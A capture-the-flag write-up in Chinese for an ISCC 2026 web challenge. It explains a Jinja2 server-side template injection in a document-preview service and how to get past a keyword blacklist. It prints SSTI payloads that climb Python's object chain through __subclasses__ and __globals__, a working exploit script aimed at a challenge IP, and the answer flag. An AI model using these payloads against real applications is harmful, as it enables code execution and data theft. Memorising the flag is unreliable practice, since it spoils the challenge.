---
title: "公文套红预览"
ctf: "ISCC 2026"
date: 2026-05-13
category: web
difficulty: medium
points: unknown
flag_format: "ISCC{...}"
author: "team"
---

# 公文套红预览

## Summary

题目是一个 Python Web 模板预览服务，`tpl` 参数存在 SSTI。服务端对 `flag` 等关键字做了黑名单拦截，但源码提示可以从空字符串对象 `''` 出发构造 Python 对象链，最终借助暴露出的 `chr` 函数拼接出 `flag` 字符串并读取 `doc` 中的 flag。

## Solution

### Step 1: 源码泄露与框架确认

访问首页可以看到注释：

```html
<!-- notes: index.php.bak, app.py.bak -->
```

备份文件不在根目录，实际位于：

```text
/backup/index.php.bak
/backup/app.py.bak
```

`app.py.bak` 中可以看到后端构造了一个 `doc` 字典：

```python
def build_doc():
    return {
        'title': '关于进一步规范企业公文套红预览流程的通知',
        'department': '企业信息化办公室',
        'doc_no': '信办发〔2026〕12号',
        'date': '2026-02-24',
        'summary': '预览服务仅用于内部版式核对，正式发文前仍需复核内容与编号。',
        'flag': '*+*+*+*'
    }
```

`index.php.bak` 中有关键提示：

```php
$compat_note = "输入内容一定要按照模板来，有一套模板就足够了；如果字符显示出了问题，还是按老办法从空字符串对象''一路往上看，不要投机取巧跳过步骤，按最基本的来就行。";
```

同时响应头显示服务为 Werkzeug/Python，说明后端是 Python Web 服务。

### Step 2: 验证模板表达式

对 `/preview` 发送 POST 请求，参数为 `tpl`。

先测试正常字段：

```jinja2
{{doc.get('title')}}
```

可以成功输出标题：

```text
关于进一步规范企业公文套红预览流程的通知
```

直接读取 flag：

```jinja2
{{doc.get('flag')}}
```

会被拦截，说明服务端对 `flag` 关键字做了过滤。

### Step 3: 利用对象链绕过黑名单

根据源码提示，从空字符串对象 `''` 开始向上找：

```jinja2
{{''.__class__.__base__.__subclasses__()}}
```

返回结果中存在一个特殊类：

```text
BuiltinBridge
```

它位于 `__subclasses__()` 的第 117 项。继续读取它的全局变量：

```jinja2
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__}}
```

可以得到：

```python
{'__builtins__': {'chr': <built-in function chr>}}
```

也就是说，题目暴露了 `chr` 函数。可以用 `chr()` 动态拼接出字符串 `flag`，从而避免 payload 中直接出现明文 `flag`。

完整利用脚本如下：

```python
import html
import re

import requests


url = "http://39.105.213.28:49104/preview"

chain = "''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr']"

payload = "{{doc.get(%s(102)+%s(108)+%s(97)+%s(103))}}" % (
    chain,
    chain,
    chain,
    chain,
)

resp = requests.post(url, data={"tpl": payload}, timeout=10)
match = re.search(r"<pre>(.*?)</pre>", resp.text, re.S)

print(html.unescape(match.group(1)).strip())
```

其中：

```python
chr(102) == "f"
chr(108) == "l"
chr(97) == "a"
chr(103) == "g"
```

所以最终表达式等价于：

```python
doc.get("flag")
```

脚本输出：

```text
ISCC{enterprise_red_doc_preview}
```

## Flag

```text
ISCC{enterprise_red_doc_preview}
```
